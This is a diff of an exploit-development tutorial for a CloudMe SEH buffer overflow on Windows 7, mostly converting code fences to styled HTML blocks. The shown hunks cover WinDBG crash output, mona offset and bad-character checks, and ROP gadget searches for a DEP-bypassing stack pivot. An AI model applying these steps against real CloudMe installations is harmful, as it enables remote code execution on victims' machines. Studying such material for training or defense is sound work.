@@ -150,7 +150,7 @@ except Exception as e:
 
 <p align="justify">Running the script above confirms the issue, and now we have a starting point developing the exploit. As we see below in <strong>WinDBG</strong>, when running the script above, the crash occurs</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 (f24.d98): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
@@ -158,15 +158,15 @@ eax=00000001 ebx=41414141 ecx=762498da edx=012d78ec esi=41414141 edi=41414141
 eip=41414141 esp=0022d470 ebp=41414141 iopl=0         nv up ei pl nz na po nc
 cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
 41414141 ??              ???
-```
+</pre>
 
 <p align="justify">It looks like there is a straight Access Violation occurred meaning that there is a crash dictating a possible overflow. However, <strong>CloudMe</strong> is running in Windows 7 professional where there is a default <b>SEH</b> protection and the application appears to be exploitable</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !exchain
 0022d908: 41414141
 Invalid exception stack at 41414141
-```
+</pre>
 
 <p align="justify">As we can see above <b>SEH</b> is overwritten with value that we control <code>\x41\x41\x41\x41</code>, so now we will proceed with <b>SEH</b> based exploitation.</p>
 
@@ -174,17 +174,20 @@ Invalid exception stack at 41414141
 <h3>2. Searching the Offset</h3>
 <p align="justify">At this point we need to check how far we are able to write and overwrite <b>SEH</b>. In order to do this we will attempt to generate 5000 byte pattern using <b>mona.py</b> as follows. First, create an output folder form mona inside logs folder. All the generated patterns and other data such as ROP chains and bad chars generated from <b>mona.py</b> will be saved there.</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 !mona config -set workingfolder c:\logs\%p
-```
+</pre>
+
 <p align="justify">From Immunity Debugger we run :</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
  !mona pattern_create 5000
-```
+</pre>
+
 <p align="justify">From WinDBG we run :</p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:009> !load pykd.pyd
 0:009> !py mona pattern_create 5000
 Hold on...
@@ -198,7 +201,7 @@ Note: don't copy this pattern from the log window, it might be truncated !
 It's better to open c:\logs\CloudMe\pattern.txt and copy the pattern from the file
 
 [+] This mona.py action took 0:00:00.125000
-```
+</pre>
 
 <p align="justify">Now that we have generated the pattern, we are able to find the exact offset where the application crashes. The following PoC script will do that.</p>
 
@@ -287,15 +290,16 @@ except Exception as e:
 
 <p align="justify">After we run the python script above, we see that the <b>nseh</b> and <b>seh</b> values are changed</p>
 
-``` 
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !exchain
 0022d908: USER32!___PchSym_  (USER32+0x83577)+0 (77433577)
 Invalid exception stack at 43347743
-```
+</pre>
 
 <p align="justify">As shown above, the <b>nseh</b> was overwritten with the pattern <b>43347743</b> and <b>SEH</b> was overwritten with the pattern <b>77433577</b>. However, because DEP is enabled, we can not simply pivot to <b>nseh</b> and run instructions from the stack. At this point we are only interested in the offset of <b>SEH</b>. Using <b>mona.py</b> we will calculate the offset of <strong>SEH</strong> as follows</p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !load pykd.pyd
 0:000> !py mona pattern_offset 77433577
 Hold on...
@@ -311,7 +315,7 @@ Looking for wC5w in pattern of 500000 bytes
  - Pattern wC5w not found in cyclic pattern (lowercase)  
 
 [+] This mona.py action took 0:00:00.375000
-```
+</pre>
 
 <p align="justify">So, the offset that causes the application to crash has been found and now we can control <b>SEH</b> by creating a junk buffer of <b>2236</b> bytes. Now, lets update the previous PoC</p>
 
@@ -339,7 +343,7 @@ except Exception as e:
 
 <p align="justify">When we run the script above, the following chain shows that we now control the exception handler</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 (794.d1c): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
@@ -350,7 +354,7 @@ cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
 0:000&gt; !exchain
 0022d908: 42424242
 Invalid exception stack at 41414141
-```
+</pre>
 
 <hr />
 <h3>3. The Bad Characters</h3>
@@ -363,7 +367,7 @@ pip3 install badchars
 <p align="justify">Then we will generate the hex chars as follows</p>
 
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:/home/kali# badchars -f python
 badchars = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -383,7 +387,7 @@ badchars = (
   "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
   "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
-```
+</pre>
 
 <p align="justify">We will use the hex chars above to identify badchars in our target. In order to do that, we will use the following python script</p>
 
@@ -430,7 +434,7 @@ except Exception as e:
 
 <p align="justify">After we run the script above, we can then explore the dump on the stack in order to search for bad characters.</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> dd esp L 500
 [..snip..]
 0022d8c0  41414141 41414141 41414141 41414141
@@ -438,35 +442,36 @@ except Exception as e:
 0022d8e0  41414141 41414141 41414141 41414141
 0022d8f0  41414141 41414141 41414141 41414141
 0022d900  41414141 41414141 41414141 42424242
-0022d910  04030201 08070605 0c0b0a09 100f0e0d
-0022d920  14131211 18171615 1c1b1a19 201f1e1d
-0022d930  24232221 28272625 2c2b2a29 302f2e2d
-0022d940  34333231 38373635 3c3b3a39 403f3e3d
-0022d950  44434241 48474645 4c4b4a49 504f4e4d
-0022d960  54535251 58575655 5c5b5a59 605f5e5d
-0022d970  64636261 68676665 6c6b6a69 706f6e6d
-0022d980  74737271 78777675 7c7b7a79 807f7e7d
-0022d990  84838281 88878685 8c8b8a89 908f8e8d
-0022d9a0  94939291 98979695 9c9b9a99 a09f9e9d
-0022d9b0  a4a3a2a1 a8a7a6a5 acabaaa9 b0afaead
-0022d9c0  b4b3b2b1 b8b7b6b5 bcbbbab9 c0bfbebd
-0022d9d0  c4c3c2c1 c8c7c6c5 cccbcac9 d0cfcecd
-0022d9e0  d4d3d2d1 d8d7d6d5 dcdbdad9 e0dfdedd
-0022d9f0  e4e3e2e1 e8e7e6e5 ecebeae9 f0efeeed
-0022da00  f4f3f2f1 f8f7f6f5 fcfbfaf9 43fffefd
+<span style="color:#33cccc;">0022d910</span><span style="color:#ff0000;">  04030201 08070605 0c0b0a09 100f0e0d
+</span>0022d920<span style="color:#ff0000;">  14131211 18171615 1c1b1a19 201f1e1d
+</span>0022d930<span style="color:#ff0000;">  24232221 28272625 2c2b2a29 302f2e2d
+</span>0022d940<span style="color:#ff0000;">  34333231 38373635 3c3b3a39 403f3e3d
+</span>0022d950<span style="color:#ff0000;">  44434241 48474645 4c4b4a49 504f4e4d
+</span>0022d960<span style="color:#ff0000;">  54535251 58575655 5c5b5a59 605f5e5d
+</span>0022d970<span style="color:#ff0000;">  64636261 68676665 6c6b6a69 706f6e6d
+</span>0022d980<span style="color:#ff0000;">  74737271 78777675 7c7b7a79 807f7e7d
+</span>0022d990<span style="color:#ff0000;">  84838281 88878685 8c8b8a89 908f8e8d
+</span>0022d9a0<span style="color:#ff0000;">  94939291 98979695 9c9b9a99 a09f9e9d
+</span>0022d9b0<span style="color:#ff0000;">  a4a3a2a1 a8a7a6a5 acabaaa9 b0afaead
+</span>0022d9c0<span style="color:#ff0000;">  b4b3b2b1 b8b7b6b5 bcbbbab9 c0bfbebd
+</span>0022d9d0<span style="color:#ff0000;">  c4c3c2c1 c8c7c6c5 cccbcac9 d0cfcecd
+</span>0022d9e0<span style="color:#ff0000;">  d4d3d2d1 d8d7d6d5 dcdbdad9 e0dfdedd
+</span>0022d9f0<span style="color:#ff0000;">  e4e3e2e1 e8e7e6e5 ecebeae9 f0efeeed
+</span>0022da00<span style="color:#ff0000;">  f4f3f2f1 f8f7f6f5 fcfbfaf9 </span>43<span style="color:#ff0000;">fffefd</span>
 0022da10  43434343 43434343 43434343 43434343
 0022da20  43434343 43434343 43434343 43434343
 0022da30  43434343 43434343 43434343 43434343
 0022da40  43434343 43434343 43434343 43434343
 0022da50  43434343 43434343 43434343 43434343
 [..snip..]
-```
+</pre>
 
 <p align="justify">The dump above shows the hex character set we have sent to the vulnerable application that starts from <b>0x0022d910</b> until <b>0x0022da0b</b> . Now its time to perform the analysis. If we take a closer look at at the character set above we can say that we might not have bad characters, but we must still investigate further in order to be sure. We can do this using <b>mona.py</b> directly from <b>windbg</b>. Lets generate the badchars with <b>mona.py</b> as follows</p>
 
-```
-0:000> !load pykd.pyd
-0:000> !py mona bytearray -cpb '\x00' 
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+0:000&gt; !load pykd.pyd
+0:000&gt; !py mona bytearray -cpb '\x00' 
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py bytearray -cpb '\x00'
@@ -488,13 +493,14 @@ Done, wrote 255 bytes to file c:\logs\CloudMe\bytearray.txt
 Binary output saved in c:\logs\CloudMe\bytearray.bin
 
 [+] This mona.py action took 0:00:00.047000
-```
+</pre>
 
 <p align="justify">As we see above, we have already set the log file and we can also see the ascii hex characters generated from <b>mona.py</b>. Also, it is worth to mention that we don't need to include the '\x00' character in our character set, because it could cut off the rest of the characters, as it could be acting as a null terminator. Nevertheless, we can see if it is considered a bad character afterwards.</p>
 <p align="justify">Now, we can use the following command to compare the character set generated with <b>mona.py</b>, with the character set we have sent to the vulnerable <b>CloudMe</b> application.</p>
 
-```
-0:000> !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
@@ -514,13 +520,13 @@ Comparing bytes from file with memory :
 0x0022d910 | Bytes omitted from input: 00
 
 [+] This mona.py action took 0:00:00.922000
-```
+</pre>
 
 <p align="justify">As we see above, we don't have bad characters, so we are good to go. But wait, not yet. Lets generate the badchars again, but at this time lets include the '\x00'. If we compare again the hex chars as we did before, we will see that the null byte considered to be a bad char as it is missing from the chars sent from the exploit.</p>
 
 
-```
-0:000> !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
@@ -584,7 +590,7 @@ Comparing bytes from file with memory :
 0x0022d910 | 
 
 [+] This mona.py action took 0:00:00.875000
-```
+</pre>
 
 <p align="justify">At this point we are good to go. We can construct any shellcode now just excluding the null character.</p>
 <hr />
@@ -592,15 +598,16 @@ Comparing bytes from file with memory :
 <p align="justify">At this point we need to transfer the execution flow back to the stack area that we control. In order to do this we will use a technique called stack pivot. This action can be accomplished by observing the location of <b>ESP</b> register at the time <b>SEH</b> gets executed in relation to the location of our payload on the stack.</p>
 <p align="justify">Before searching any gadget, we should first use <b>mona.py</b> again, to search for modules with no restrictions</p>
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> !py mona modules
 Hold on...
 [.....]
-```
+</pre>
 
 <p align="justify">If we take a closer look at the modules info table generated from mona, we can see that there are some specific modules with no restrictions at all. Furthermore we have identified one of these modules with no restrictions which is the <b>Qt5Sql.dll</b>. We can use this specific .dll in order to search for gadgets that can help us in stack pivoting.</p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 pentest@pentest-PC MINGW32 ~/Desktop/ROPgadget (master)
 $ python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll" --only "ret" --depth 5 --badbytes "00"
 Gadgets information
@@ -611,7 +618,7 @@ Gadgets information
 0x6d9d782a : ret 0x11b
 0x6d9d9c6a : ret 0x125
 [...]
-```
+</pre>
 
 <p align="justify">Using the <b>ROPgadget</b> tool ( clone from <a href="https://github.com/JonathanSalwan/ROPgadget">here </a>), we have chosen to search for gadgets from <b>Qt5Sql.dll</b>. The gadget we want to search is the <b>ret</b> instruction</p>
 
@@ -706,16 +713,18 @@ except Exception as e:
 
 <p align="justify">The following address <b>0x6d9c1011</b> was selected with the only purpose of setting a breakpoint in order to calculate <b>ESP</b> relative offset once we hit it. At this point we use the first 2236 bytes to get to <b>SEH</b>.</p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> bp 0x6d9c1011
 *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll - 
 0:000> bl 
  0 e 6d9c1011     0001 (0001)  0:**** Qt5Sql+0x1011
-```
+</pre>
 
 <p align="justify">Following, we load the payload and continue execution until we hit the breakpoint</p>
 
-```
+
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0:000> g
 Breakpoint 0 hit
 eax=00000000 ebx=00000000 ecx=6d9c1011 edx=779e71cd esi=00000000 edi=00000000
@@ -723,7 +732,7 @@ eip=6d9c1011 esp=0022cf18 ebp=0022cf38 iopl=0         nv up ei pl zr na pe nc
 cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
 Qt5Sql+0x1011:
 6d9c1011 c3              ret
-```
+</pre>
 
 <p align="justify">As we see above, after hitting the breakpoint, the <b>ESP</b> is pointing to <b>0x0022cf18</b>. Now lets look at the stack to locate the beginning of the payload. In order to search for the beginning of the payload we will use the <b>ESP</b> value at the time of crash which is <b>0x0022d470</b> .After looking throughout the stack we have located the beginning of the payload at the following location (<b>0x0022d050</b>):</p>
 
